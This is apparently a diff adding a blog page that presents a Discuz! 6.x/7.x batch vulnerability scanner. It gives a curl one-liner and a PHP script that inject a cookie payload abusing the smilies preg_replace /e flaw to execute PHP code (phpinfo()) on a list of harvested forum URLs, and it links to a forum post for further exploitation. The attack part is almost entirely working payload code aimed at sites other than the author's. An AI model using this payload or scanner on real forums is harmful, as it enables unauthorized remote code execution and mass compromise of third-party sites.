@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="用法 先 用抓取url工具 抓取 若干 url (url为 带表情的帖子，或回复)存放至 dz.txt 文件 然后执行本脚本  漏洞利用请关注 第82楼 单个测试语句(windows)： 1curl &apos;http://bbs.test.com/viewthread.php?tid=29958&apos; -s --cookie &apos;GLOBALS[_DCACHE][smilies][searcharray]=">
+<meta name="keywords" content="php代码控">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Discuz! 6.x&#x2F;7.x 批量检测脚本">
+<meta property="og:url" content="http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/index.html">
+<meta property="og:site_name" content="wolvez&#39;s blog">
+<meta property="og:description" content="用法 先 用抓取url工具 抓取 若干 url (url为 带表情的帖子，或回复)存放至 dz.txt 文件 然后执行本脚本  漏洞利用请关注 第82楼 单个测试语句(windows)： 1curl &apos;http://bbs.test.com/viewthread.php?tid=29958&apos; -s --cookie &apos;GLOBALS[_DCACHE][smilies][searcharray]=">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-07-16T15:38:18.670Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Discuz! 6.x&#x2F;7.x 批量检测脚本">
+<meta name="twitter:description" content="用法 先 用抓取url工具 抓取 若干 url (url为 带表情的帖子，或回复)存放至 dz.txt 文件 然后执行本脚本  漏洞利用请关注 第82楼 单个测试语句(windows)： 1curl &apos;http://bbs.test.com/viewthread.php?tid=29958&apos; -s --cookie &apos;GLOBALS[_DCACHE][smilies][searcharray]=">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon_wolv.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon_wolv.ico" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon_wolv.ico">
+          
+        
+    
+    <!-- title -->
+    <title>Discuz! 6.x/7.x 批量检测脚本</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2015/02/06/wordpress-brute/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2014/08/06/php-Thread/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/&text=Discuz! 6.x/7.x 批量检测脚本"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/&title=Discuz! 6.x/7.x 批量检测脚本"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/&is_video=false&description=Discuz! 6.x/7.x 批量检测脚本"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Discuz! 6.x/7.x 批量检测脚本&body=Check out this article: http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/&title=Discuz! 6.x/7.x 批量检测脚本"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/&title=Discuz! 6.x/7.x 批量检测脚本"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/&title=Discuz! 6.x/7.x 批量检测脚本"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/&title=Discuz! 6.x/7.x 批量检测脚本"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/&name=Discuz! 6.x/7.x 批量检测脚本&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Discuz! 6.x/7.x 批量检测脚本
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">wolvez's blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2014-11-24T19:05:00.000Z" itemprop="datePublished">2014-11-25</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/php代码控/">php代码控</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>用法 先 用抓取url工具 抓取 若干 url (url为 带表情的帖子，或回复)<br>存放至 dz.txt 文件 然后执行本脚本</p>
+</blockquote>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=28573&extra=&page=9" target="_blank" rel="noopener">漏洞利用请关注</a> 第82楼</p>
+<p><strong>单个测试语句(windows)：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">'http://bbs.test.com/viewthread.php?tid=29958'</span> -s --cookie <span class="string">'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();'</span> |findstr /i /c:<span class="string">'&lt;h2&gt;PHP License&lt;/h2&gt;'</span></span><br></pre></td></tr></table></figure>
+
+<p>有返回说明有洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$rc-&gt;__set(<span class="string">'time_out'</span>, $timeout); <span class="comment">//设置超时时间</span></span><br><span class="line"></span><br><span class="line">$urls=file(<span class="string">'dz.txt'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($urls <span class="keyword">as</span> $url) &#123;</span><br><span class="line"><span class="comment">//$url=trim($url);</span></span><br><span class="line">$request = <span class="keyword">new</span> RollingCurlRequest(trim($url));</span><br><span class="line">$request-&gt;options = <span class="keyword">array</span>(CURLOPT_HTTPHEADER =&gt; <span class="keyword">array</span>(<span class="string">'Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();'</span>));</span><br><span class="line"></span><br><span class="line">$rc-&gt;add($request);</span><br><span class="line">&#125;</span><br><span class="line">$rc-&gt;execute();</span><br><span class="line"><span class="comment">//时间统计函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func_time</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">list</span>($microsec, $sec) = explode(<span class="string">' '</span>, microtime());</span><br><span class="line"><span class="keyword">return</span> $microsec + $sec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'\r\n'</span>.<span class="string">'time: '</span> . round((func_time() – $start_time), <span class="number">4</span>) . <span class="string">'sec '</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/&text=Discuz! 6.x/7.x 批量检测脚本"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/&title=Discuz! 6.x/7.x 批量检测脚本"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/&is_video=false&description=Discuz! 6.x/7.x 批量检测脚本"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Discuz! 6.x/7.x 批量检测脚本&body=Check out this article: http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/&title=Discuz! 6.x/7.x 批量检测脚本"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/&title=Discuz! 6.x/7.x 批量检测脚本"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/&title=Discuz! 6.x/7.x 批量检测脚本"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/&title=Discuz! 6.x/7.x 批量检测脚本"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://wolvez.club/2014/11/25/Discuz6-x-7-x-exp/&name=Discuz! 6.x/7.x 批量检测脚本&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 wolvez
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
